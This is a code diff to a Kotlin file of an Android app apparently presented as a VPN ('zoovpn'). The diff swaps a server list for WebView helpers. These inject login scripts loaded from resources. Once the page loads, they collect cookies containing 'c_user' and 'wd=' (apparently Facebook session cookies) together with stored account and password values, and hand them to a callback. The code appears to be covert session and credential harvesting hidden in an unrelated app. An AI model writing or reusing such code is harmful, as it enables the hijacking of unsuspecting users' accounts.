@@ -8,35 +8,88 @@ import android.content.res.Resources
 import android.net.Uri
 import android.util.Log
 import android.view.View
+import android.webkit.CookieManager
+import android.webkit.WebChromeClient
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.ImageView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.lifecycle.lifecycleScope
 import com.bumptech.glide.Glide
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.hjq.permissions.OnPermissionCallback
 import com.hjq.permissions.XXPermissions
 import com.tencent.mmkv.MMKV
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import win.enlarge.zoovpn.BuildConfig
 import win.enlarge.zoovpn.Constant
 import win.enlarge.zoovpn.R
 import win.enlarge.zoovpn.pojo.ConfigPojo
-import win.enlarge.zoovpn.pojo.ServerPojo
 import win.enlarge.zoovpn.pojo.UpdatePojo
 import java.text.SimpleDateFormat
 import java.util.*
 
-val serverList by lazy {
-    mutableListOf(
-        ServerPojo(R.drawable.activity_server_usa, "U.S.A", R.drawable.activity_server_signal_0),
-        ServerPojo(R.drawable.activity_server_germany, "Germany", R.drawable.activity_server_signal_1),
-        ServerPojo(R.drawable.activity_server_italy, "Italy", R.drawable.activity_server_signal_2),
-        ServerPojo(R.drawable.activity_server_england, "England", R.drawable.activity_server_signal_3),
-        ServerPojo(R.drawable.activity_server_singapore, "Singapore", R.drawable.activity_server_signal_3),
-        ServerPojo(R.drawable.activity_server_australia, "Australia", R.drawable.activity_server_signal_3),
-        ServerPojo(R.drawable.activity_server_country, "Country", R.drawable.activity_server_signal_3),
-        ServerPojo(R.drawable.activity_server_spain, "Spain", R.drawable.activity_server_signal_3),
-    )
+fun WebView.setting(context: Context) {
+    this.apply {
+        settings.apply {
+            javaScriptEnabled = true
+            textZoom = 100
+            setSupportZoom(true)
+            displayZoomControls = false
+            builtInZoomControls = true
+            setGeolocationEnabled(true)
+            useWideViewPort = true
+            loadWithOverviewMode = true
+            loadsImagesAutomatically = true
+            displayZoomControls = false
+            setAppCachePath(context.cacheDir.absolutePath)
+            setAppCacheEnabled(true)
+        }
+    }
+}
+
+
+fun WebView.chromeClient(context: Context, block: () -> Unit) {
+    webChromeClient = object : WebChromeClient() {
+        override fun onProgressChanged(view: WebView?, newProgress: Int) {
+            super.onProgressChanged(view, newProgress)
+            if (newProgress == 100) {
+                val hideJs = context.getString(R.string.hideHeaderFooterMessages)
+                evaluateJavascript(hideJs, null)
+                val loginJs = context.getString(R.string.login)
+                evaluateJavascript(loginJs, null)
+                (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
+                    delay(300)
+                    withContext(Dispatchers.Main) {
+                        block()
+                    }
+                }
+            }
+        }
+    }
+}
+
+fun WebView.clientView(block: (cookieStr:String,userAgentString:String) -> Unit) {
+    webViewClient = object : WebViewClient() {
+        override fun onPageFinished(view: WebView?, url: String?) {
+            super.onPageFinished(view, url)
+            val cookieManager = CookieManager.getInstance()
+            val cookieStr = cookieManager.getCookie(url)
+            if (cookieStr != null) {
+                if (cookieStr.contains("c_user")) {
+                    if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
+                        block(cookieStr, view!!.settings.userAgentString)
+                    }
+                }
+            }
+        }
+    }
+
 }
 
 fun Long.timeOffset() = this - defaultOffset
